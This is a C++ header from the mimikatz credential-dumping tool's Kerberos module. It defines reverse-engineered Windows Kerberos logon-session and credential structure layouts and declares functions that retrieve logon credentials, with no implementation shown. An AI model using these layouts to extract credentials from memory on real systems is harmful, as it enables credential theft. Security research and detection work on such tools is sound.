/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#pragma once
#include "../mod_mimikatz_sekurlsa.h"

class mod_mimikatz_sekurlsa_kerberos {

private:
	typedef struct _KIWI_KERBEROS_LOGON_SESSION
	{
		struct _KIWI_KERBEROS_LOGON_SESSION *Flink;
		struct _KIWI_KERBEROS_LOGON_SESSION *Blink;
		DWORD	UsageCount;
		PVOID	unk0;
		PVOID	unk1;
		PVOID	unk2;
		DWORD	unk3;
		DWORD	unk4;
		PVOID	unk5;
		PVOID	unk6;
		PVOID	unk7;
		LUID LocallyUniqueIdentifier;
	#ifdef _M_IX86
		DWORD	unk8;
	#endif
		DWORD	unk9;
		DWORD	unk10;
		PVOID	unk11;
		DWORD	unk12;
		DWORD	unk13;
		PVOID	unk14;
		PVOID	unk15;
		PVOID	unk16;
		KIWI_GENERIC_PRIMARY_CREDENTIAL	credentials;
	} KIWI_KERBEROS_LOGON_SESSION, *PKIWI_KERBEROS_LOGON_SESSION;

	typedef struct _KIWI_KERBEROS_PRIMARY_CREDENTIAL
	{
		DWORD unk0;
		PVOID unk1;
		PVOID unk2;
		PVOID unk3;
	#ifdef _M_X64
		BYTE unk4[32];
	#elif defined _M_IX86
		BYTE unk4[20];
	#endif
		LUID LocallyUniqueIdentifier;
	#ifdef _M_X64
		BYTE unk5[44];
	#elif defined _M_IX86
		BYTE unk5[36];
	#endif
		KIWI_GENERIC_PRIMARY_CREDENTIAL	credentials;
	} KIWI_KERBEROS_PRIMARY_CREDENTIAL, *PKIWI_KERBEROS_PRIMARY_CREDENTIAL;

	static PKIWI_KERBEROS_LOGON_SESSION KerbLogonSessionList;
	static long offsetMagic;
	static PRTL_AVL_TABLE KerbGlobalLogonSessionTable;
	static bool searchKerberosFuncs();

public:
	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModKERBEROS;
	static bool getKerberos(vector<wstring> * arguments);
	static bool WINAPI getKerberosLogonData(__in PLUID logId, __in bool justSecurity);
};
